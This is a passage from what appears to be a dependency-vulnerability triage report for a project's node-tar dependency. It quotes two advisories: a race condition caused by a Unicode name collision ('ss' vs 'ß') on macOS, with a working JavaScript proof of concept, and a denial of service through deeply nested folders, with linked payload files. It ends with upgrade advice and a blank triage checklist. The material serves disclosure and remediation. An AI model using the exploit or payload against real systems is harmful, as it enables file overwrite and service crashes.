total 8
drwxr-xr-x   3 testuser  staff    96 Jan 19 01:25 .
drwxr-x---+ 82 testuser  staff  2624 Jan 19 01:25 ..
-rw-r--r--   1 testuser  staff    16 Jan 19 01:26 collision_test_ss
bash-3.2$ 
``````

---

### PoC

``````javascript
const tar = require('tar');
const fs = require('fs');
const path = require('path');
const { PassThrough } = require('stream');

const exploitDir = path.resolve('race_exploit_dir');
if (fs.existsSync(exploitDir)) fs.rmSync(exploitDir, { recursive: true, force: true });
fs.mkdirSync(exploitDir);

console.log('[*] Testing...');
console.log(`[*] Extraction target: ${exploitDir}`);

// Construct stream
const stream = new PassThrough();

const contentA = 'A'.repeat(1000);
const contentB = 'B'.repeat(1000);

// Key 1: "f_ss"
const header1 = new tar.Header({
    path: 'collision_ss',
    mode: 0o644,
    size: contentA.length,
});
header1.encode();

// Key 2: "f_ß"
const header2 = new tar.Header({
    path: 'collision_ß',
    mode: 0o644,
    size: contentB.length,
});
header2.encode();

// Write to stream
stream.write(header1.block);
stream.write(contentA);
stream.write(Buffer.alloc(512 - (contentA.length % 512))); // Padding

stream.write(header2.block);
stream.write(contentB);
stream.write(Buffer.alloc(512 - (contentB.length % 512))); // Padding

// End
stream.write(Buffer.alloc(1024));
stream.end();

// Extract
const extract = new tar.Unpack({
    cwd: exploitDir,
    // Ensure jobs is high enough to allow parallel processing if locks fail
    jobs: 8 
});

stream.pipe(extract);

extract.on('end', () => {
    console.log('[*] Extraction complete');

    // Check what exists
    const files = fs.readdirSync(exploitDir);
    console.log('[*] Files in exploit dir:', files);
    files.forEach(f => {
        const p = path.join(exploitDir, f);
        const stat = fs.statSync(p);
        const content = fs.readFileSync(p, 'utf8');
        console.log(`File: ${f}, Inode: ${stat.ino}, Content: ${content.substring(0, 10)}... (Length: ${content.length})`);
    });

    if (files.length === 1 || (files.length === 2 && fs.statSync(path.join(exploitDir, files[0])).ino === fs.statSync(path.join(exploitDir, files[1])).ino)) {
        console.log('\[*] GOOD');
    } else {
        console.log('[-] No collision');
    }
});

``````

---

### Impact
This is a **Race Condition** which enables **Arbitrary File Overwrite**. This vulnerability affects users and systems using **node-tar on macOS (APFS/HFS+)**. Because of using `NFD` Unicode normalization (in which `ß` and `ss` are different), conflicting paths do not have their order properly preserved under filesystems that ignore Unicode normalization (e.g., APFS (in which `ß` causes an inode collision with `ss`)). This enables an attacker to circumvent internal parallelization locks (`PathReservations`) using conflicting filenames within a malicious tar archive.

---

### Remediation

Update `path-reservations.js` to use a normalization form that matches the target filesystem's behavior (e.g., `NFKD`), followed by first `toLocaleLowerCase('en')` and then `toLocaleUpperCase('en')`.

Users who cannot upgrade promptly, and who are programmatically using `node-tar` to extract arbitrary tarball data should filter out all `SymbolicLink` entries (as npm does) to defend against arbitrary file writes via this file system entry name collision issue.

---

**Fixed In:** 7.5.4

**Direct Upgrade:** `npm install tar@7.5.4` (adds as direct dependency)

**Suggested Fix:** npm install tar@latest (upgrade parent)

---

#### GHSA-f5x3-32g6-xq36

**Severity:** MEDIUM

**CVSS Score:** 7.5

**Dependency Chain:** grocery-infra → tar

**Summary:** Denial of service while parsing a tar file due to lack of folders count validation

**Details:** ## Description: 
During some analysis today on npm's `node-tar` package I came across the folder creation process, Basicly if you provide node-tar with a path like this `./a/b/c/foo.txt` it would create every folder and sub-folder here a, b and c until it reaches the last folder to create `foo.txt`, In-this case I noticed that there's no validation at all on the amount of folders being created, that said we're actually able to CPU and memory consume the system running node-tar and even crash the nodejs client within few seconds of running it using a path with too many sub-folders inside

## Steps To Reproduce:
You can reproduce this issue by downloading the tar file I provided in the resources and using node-tar to extract it, you should get the same behavior as the video

## Proof Of Concept:
Here's a [video](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/3i7uojw8s52psar6pg8zkdo4h9io?response-content-disposition=attachment%3B%20filename%3D%22tar-dos-poc.webm%22%3B%20filename%2A%3DUTF-8%27%27tar-dos-poc.webm&response-content-type=video%2Fwebm&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSWWGDXHA%2F20240312%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240312T080103Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDcaCXVzLXdlc3QtMiJHMEUCID3xYDc6emXVPOg8iVR5dVk0u3gguTPIDJ0OIE%2BKxj17AiEAi%2BGiay1gGMWhH%2F031fvMYnSsa8U7CnpZpxvFAYqNRwgqsQUIQBADGgwwMTM2MTkyNzQ4NDkiDAaj6OgUL3gg4hhLLCqOBUUrOgWSqaK%2FmxN6nKRvB4Who3LIyzswFKm9LV94GiSVFP3zXYA480voCmAHTg7eBL7%2BrYgV2RtXbhF4aCFMCN3qu7GeXkIdH7xwVMi9zXHkekviSKZ%2FsZtVVjn7RFqOCKhJl%2FCoiLQJuDuju%2FtfdTGZbEbGsPgKHoILYbRp81K51zeRL21okjsOehmypkZzq%2BoGrXIX0ynPOKujxw27uqdF4T%2BF9ynodq01vGgwgVBEjHojc4OKOfr1oW5b%2FtGVV59%2BOBVI1hqIKHRG0Ed4SWmp%2BLd1hazGuZPvp52szmegnOj5qr3ubppnKL242bX%2FuAnQKzKK0HpwolqXjsuEeFeM85lxhqHV%2B1BJqaqSHHDa0HUMLZistMRshRlntuchcFQCR6HBa2c8PSnhpVC31zMzvYMfKsI12h4HB6l%2FudrmNrvmH4LmNpi4dZFcio21DzKj%2FRjWmxjH7l8egDyG%2FIgPMY6Ls4IiN7aR1jijYTrBCgPUUHets3BFvqLzHtPFnG3B7%2FYRPnhCLu%2FgzvKN3F8l38KqeTNMHJaxkuhCvEjpFB2SJbi2QZqZZbLj3xASqXoogzbsyPp0Tzp0tH7EKDhPA7H6wwiZukXfFhhlYzP8on9fO2Ajz%2F%2BTDkDjbfWw4KNJ0cFeDsGrUspqQZb5TAKlUge7iOZEc2TZ5uagatSy9Mg08E4nImBSE5QUHDc7Daya1gyqrETMDZBBUHH2RFkGA9qMpEtNrtJ9G%2BPedz%2FpPY1hh9OCp9Pg1BrX97l3SfVzlAMRfNibhywq6qnE35rVnZi%2BEQ1UgBjs9jD%2FQrW49%2FaD0oUDojVeuFFryzRnQxDbKtYgonRcItTvLT5Y0xaK9P0u6H1197%2FMk3XxmjD9%2Fb%2BvBjqxAQWWkKiIxpC1oHEWK9Jt8UdJ39xszDBGpBqjB6Tvt5ePAXSyX8np%2FrBi%2BAPx06O0%2Ba7pU4NmH800EVXxxhgfj9nMw3CeoUIdxorVKtU2Mxw%2FLaAiPgxPS4rqkt65NF7eQYfegcSYDTm2Z%2BHPbz9HfCaVZ28Zqeko6sR%2F29ML4bguqVvHAM4mWPLNDXH33mjG%2BuzLi8e1BF7tNveg2X9G%2FRdcMkojwKYbu6xN3M6aX2alQg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1e8235d885f1d61529b7d6b23ea3a0780c300c91d86e925dd8310d5b661ddbe2) show-casing the exploit: 

## Impact

Denial of service by crashing the nodejs client when attempting to parse a tar archive, make it run out of heap memory and consuming server CPU and memory resources

## Report resources
[payload.txt](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/1e83ayb5dd3350fvj3gst0mqixwk?response-content-disposition=attachment%3B%20filename%3D%22payload.txt%22%3B%20filename%2A%3DUTF-8%27%27payload.txt&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSWWGDXHA%2F20240312%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240312T080103Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDcaCXVzLXdlc3QtMiJHMEUCID3xYDc6emXVPOg8iVR5dVk0u3gguTPIDJ0OIE%2BKxj17AiEAi%2BGiay1gGMWhH%2F031fvMYnSsa8U7CnpZpxvFAYqNRwgqsQUIQBADGgwwMTM2MTkyNzQ4NDkiDAaj6OgUL3gg4hhLLCqOBUUrOgWSqaK%2FmxN6nKRvB4Who3LIyzswFKm9LV94GiSVFP3zXYA480voCmAHTg7eBL7%2BrYgV2RtXbhF4aCFMCN3qu7GeXkIdH7xwVMi9zXHkekviSKZ%2FsZtVVjn7RFqOCKhJl%2FCoiLQJuDuju%2FtfdTGZbEbGsPgKHoILYbRp81K51zeRL21okjsOehmypkZzq%2BoGrXIX0ynPOKujxw27uqdF4T%2BF9ynodq01vGgwgVBEjHojc4OKOfr1oW5b%2FtGVV59%2BOBVI1hqIKHRG0Ed4SWmp%2BLd1hazGuZPvp52szmegnOj5qr3ubppnKL242bX%2FuAnQKzKK0HpwolqXjsuEeFeM85lxhqHV%2B1BJqaqSHHDa0HUMLZistMRshRlntuchcFQCR6HBa2c8PSnhpVC31zMzvYMfKsI12h4HB6l%2FudrmNrvmH4LmNpi4dZFcio21DzKj%2FRjWmxjH7l8egDyG%2FIgPMY6Ls4IiN7aR1jijYTrBCgPUUHets3BFvqLzHtPFnG3B7%2FYRPnhCLu%2FgzvKN3F8l38KqeTNMHJaxkuhCvEjpFB2SJbi2QZqZZbLj3xASqXoogzbsyPp0Tzp0tH7EKDhPA7H6wwiZukXfFhhlYzP8on9fO2Ajz%2F%2BTDkDjbfWw4KNJ0cFeDsGrUspqQZb5TAKlUge7iOZEc2TZ5uagatSy9Mg08E4nImBSE5QUHDc7Daya1gyqrETMDZBBUHH2RFkGA9qMpEtNrtJ9G%2BPedz%2FpPY1hh9OCp9Pg1BrX97l3SfVzlAMRfNibhywq6qnE35rVnZi%2BEQ1UgBjs9jD%2FQrW49%2FaD0oUDojVeuFFryzRnQxDbKtYgonRcItTvLT5Y0xaK9P0u6H1197%2FMk3XxmjD9%2Fb%2BvBjqxAQWWkKiIxpC1oHEWK9Jt8UdJ39xszDBGpBqjB6Tvt5ePAXSyX8np%2FrBi%2BAPx06O0%2Ba7pU4NmH800EVXxxhgfj9nMw3CeoUIdxorVKtU2Mxw%2FLaAiPgxPS4rqkt65NF7eQYfegcSYDTm2Z%2BHPbz9HfCaVZ28Zqeko6sR%2F29ML4bguqVvHAM4mWPLNDXH33mjG%2BuzLi8e1BF7tNveg2X9G%2FRdcMkojwKYbu6xN3M6aX2alQg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bad9fe731f05a63a950f99828125653a8c1254750fe0ca7be882e89ecdd449ae)
[archeive.tar.gz](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ymkuh4xnfdcf1soeyi7jc2x4yt2i?response-content-disposition=attachment%3B%20filename%3D%22archive.tar.gz%22%3B%20filename%2A%3DUTF-8%27%27archive.tar.gz&response-content-type=application%2Fx-tar&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSWWGDXHA%2F20240312%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240312T080103Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDcaCXVzLXdlc3QtMiJHMEUCID3xYDc6emXVPOg8iVR5dVk0u3gguTPIDJ0OIE%2BKxj17AiEAi%2BGiay1gGMWhH%2F031fvMYnSsa8U7CnpZpxvFAYqNRwgqsQUIQBADGgwwMTM2MTkyNzQ4NDkiDAaj6OgUL3gg4hhLLCqOBUUrOgWSqaK%2FmxN6nKRvB4Who3LIyzswFKm9LV94GiSVFP3zXYA480voCmAHTg7eBL7%2BrYgV2RtXbhF4aCFMCN3qu7GeXkIdH7xwVMi9zXHkekviSKZ%2FsZtVVjn7RFqOCKhJl%2FCoiLQJuDuju%2FtfdTGZbEbGsPgKHoILYbRp81K51zeRL21okjsOehmypkZzq%2BoGrXIX0ynPOKujxw27uqdF4T%2BF9ynodq01vGgwgVBEjHojc4OKOfr1oW5b%2FtGVV59%2BOBVI1hqIKHRG0Ed4SWmp%2BLd1hazGuZPvp52szmegnOj5qr3ubppnKL242bX%2FuAnQKzKK0HpwolqXjsuEeFeM85lxhqHV%2B1BJqaqSHHDa0HUMLZistMRshRlntuchcFQCR6HBa2c8PSnhpVC31zMzvYMfKsI12h4HB6l%2FudrmNrvmH4LmNpi4dZFcio21DzKj%2FRjWmxjH7l8egDyG%2FIgPMY6Ls4IiN7aR1jijYTrBCgPUUHets3BFvqLzHtPFnG3B7%2FYRPnhCLu%2FgzvKN3F8l38KqeTNMHJaxkuhCvEjpFB2SJbi2QZqZZbLj3xASqXoogzbsyPp0Tzp0tH7EKDhPA7H6wwiZukXfFhhlYzP8on9fO2Ajz%2F%2BTDkDjbfWw4KNJ0cFeDsGrUspqQZb5TAKlUge7iOZEc2TZ5uagatSy9Mg08E4nImBSE5QUHDc7Daya1gyqrETMDZBBUHH2RFkGA9qMpEtNrtJ9G%2BPedz%2FpPY1hh9OCp9Pg1BrX97l3SfVzlAMRfNibhywq6qnE35rVnZi%2BEQ1UgBjs9jD%2FQrW49%2FaD0oUDojVeuFFryzRnQxDbKtYgonRcItTvLT5Y0xaK9P0u6H1197%2FMk3XxmjD9%2Fb%2BvBjqxAQWWkKiIxpC1oHEWK9Jt8UdJ39xszDBGpBqjB6Tvt5ePAXSyX8np%2FrBi%2BAPx06O0%2Ba7pU4NmH800EVXxxhgfj9nMw3CeoUIdxorVKtU2Mxw%2FLaAiPgxPS4rqkt65NF7eQYfegcSYDTm2Z%2BHPbz9HfCaVZ28Zqeko6sR%2F29ML4bguqVvHAM4mWPLNDXH33mjG%2BuzLi8e1BF7tNveg2X9G%2FRdcMkojwKYbu6xN3M6aX2alQg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5e2c0d4b4de40373ac0fe91908c2659141a6dd4ab850271cc26042a3885c82ea)

## Note
This report was originally reported to GitHub bug bounty program, they asked me to report it to you a month ago

**Fixed In:** 6.2.1, 6.2.1

**Direct Upgrade:** `npm install tar@6.2.1` (adds as direct dependency)

**Suggested Fix:** npm install tar@latest (upgrade parent)

---

## Remediation Plan

**Triage Status:** Pending

**Upgrade Decision:** _To be determined by triage agent_

### Analysis

- **Current Version:** _To be determined_
- **Target Version:** _To be determined_
- **Breaking Changes:** _To be determined_
- **Affected Code:** _To be determined by codebase analysis_
- **Exposure Analysis:** _To be determined_

### Recommendation

_To be filled in by triage agent after codebase analysis_

### Testing Checklist

- [ ] Run existing test suite
- [ ] Verify no breaking changes in affected code paths
- [ ] Smoke test affected functionality

---

